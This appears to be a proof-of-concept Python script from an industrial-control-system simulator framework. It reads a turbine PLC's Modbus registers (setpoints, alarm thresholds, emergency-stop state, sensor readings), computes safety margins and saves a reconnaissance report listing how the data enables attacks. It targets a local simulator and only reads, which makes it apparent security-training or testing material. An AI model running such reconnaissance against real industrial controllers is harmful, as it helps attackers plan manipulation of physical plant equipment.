#!/usr/bin/env python3
"""
Adapted reconnaissance script for ICS simulator framework.

Demonstrates unauthorized reading of turbine control parameters
using the framework's protocol abstraction layer.
"""

import asyncio
import json
from datetime import datetime

from components.adapters.pymodbus_3114 import PyModbus3114Adapter
from components.protocols.modbus_protocol import ModbusProtocol


async def read_turbine_config(host: str, port: int, unit_id: int = 1) -> dict:
    """Read turbine configuration using framework protocols."""

    # Create adapter and protocol
    adapter = PyModbus3114Adapter(
        host=host, port=port, device_id=unit_id, simulator_mode=False
    )
    protocol = ModbusProtocol(adapter)

    # Connect
    if not await protocol.connect():
        print(f"    [!] Failed to connect to {host}:{port}")
        return None

    config = {}

    try:
        # Read holding registers (configuration/setpoints)
        # Speed setpoint (register 1000)
        result = await adapter.read_holding_registers(1000, 1)
        if not result.isError():
            config["speed_setpoint_rpm"] = result.registers[0]
        else:
            config["speed_setpoint_rpm"] = None

        # Temperature alarm threshold (register 1050)
        result = await adapter.read_holding_registers(1050, 1)
        if not result.isError():
            config["temp_alarm_threshold_f"] = result.registers[0]
        else:
            config["temp_alarm_threshold_f"] = None

        # Emergency stop status (register 1100)
        result = await adapter.read_holding_registers(1100, 1)
        if not result.isError():
            config["emergency_stop_active"] = bool(result.registers[0])
        else:
            config["emergency_stop_active"] = None

        # Read input registers (current sensor values)
        # Current speed (register 2000)
        result = await adapter.read_input_registers(2000, 1)
        if not result.isError():
            config["current_speed_rpm"] = result.registers[0]
        else:
            config["current_speed_rpm"] = None

        # Power output (register 2001)
        result = await adapter.read_input_registers(2001, 1)
        if not result.isError():
            config["power_output_mw"] = result.registers[0]
        else:
            config["power_output_mw"] = None

        # Steam pressure (register 2002)
        result = await adapter.read_input_registers(2002, 1)
        if not result.isError():
            config["steam_pressure_psi"] = result.registers[0]
        else:
            config["steam_pressure_psi"] = None

        # Steam temperature (register 2003)
        result = await adapter.read_input_registers(2003, 1)
        if not result.isError():
            config["steam_temperature_f"] = result.registers[0]
        else:
            config["steam_temperature_f"] = None

        # Bearing temperature (register 2004)
        result = await adapter.read_input_registers(2004, 1)
        if not result.isError():
            config["bearing_temperature_f"] = result.registers[0]
        else:
            config["bearing_temperature_f"] = None

        # Vibration (register 2005)
        result = await adapter.read_input_registers(2005, 1)
        if not result.isError():
            config["vibration_mils"] = result.registers[0]
        else:
            config["vibration_mils"] = None

    finally:
        await protocol.disconnect()

    return config


async def demonstrate_impact():
    """Show what an attacker could learn from this access."""

    print("=" * 70)
    print("[*] Proof of Concept: Unauthorized Turbine Configuration Access")
    print("[*] Using ICS Simulator Framework Protocol Abstraction")
    print("[*] This is a READ-ONLY demonstration")
    print("=" * 70 + "\n")

    # Target turbines (adjust ports based on your config)
    turbines = [
        ("localhost", 15020, 1, "Turbine PLC 1"),
    ]

    results = {}
    successful_reads = 0

    for host, port, unit_id, name in turbines:
        print(f"[*] Reading configuration from {name} ({host}:{port})...")
        config = await read_turbine_config(host, port, unit_id)

        if config:
            results[name] = config
            successful_reads += 1

            print(f"    Speed Setpoint: {config['speed_setpoint_rpm']} RPM")
            print(f"    Current Speed: {config['current_speed_rpm']} RPM")
            print(f"    Power Output: {config['power_output_mw']} MW")
            print(f"    Steam Pressure: {config['steam_pressure_psi']} PSI")
            print(f"    Steam Temperature: {config['steam_temperature_f']}°F")
            print(f"    Bearing Temperature: {config['bearing_temperature_f']}°F")
            print(f"    Vibration: {config['vibration_mils']} mils")
            print(f"    Temp Alarm Threshold: {config['temp_alarm_threshold_f']}°F")
            print(f"    E-Stop Active: {config['emergency_stop_active']}")

            # Calculate safety margins
            if config["bearing_temperature_f"] and config["temp_alarm_threshold_f"]:
                margin = (
                    config["temp_alarm_threshold_f"] - config["bearing_temperature_f"]
                )
                print(f"    Temperature Safety Margin: {margin}°F")
            print()
        else:
            print(f"    [!] Could not read from {name}\n")

    if successful_reads == 0:
        print("[!] No turbines accessible. Ensure simulator is running:")
        print("    python3 tools/enhanced_simulator_manager.py")
        return

    # Save results
    output = {
        "timestamp": datetime.now().isoformat(),
        "demonstration": "framework_turbine_reconnaissance",
        "turbines_scanned": len(turbines),
        "successful_reads": successful_reads,
        "turbines": results,
        "impact_assessment": {
            "data_exposure": [
                "Complete operational state visible",
                "Safety thresholds and margins revealed",
                "Real-time sensor data accessible",
                "Control setpoints exposed",
            ],
            "attack_enablement": [
                "Baseline data collected for anomaly evasion",
                "Safety margins identified for precise attacks",
                "Operational parameters enable manipulation planning",
                "Real-time monitoring of attack effects possible",
            ],
        },
    }

    filename = f"recon_turbine_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w") as f:
        json.dump(output, f, indent=2)

    print("[*] " + "=" * 66)
    print(f"[*] Results saved to {filename}")
    print("[*] No modifications made - read-only reconnaissance")
    print("[*] " + "=" * 66)


if __name__ == "__main__":
    try:
        asyncio.run(demonstrate_impact())
    except KeyboardInterrupt:
        print("\n[*] Reconnaissance interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback

        traceback.print_exc()
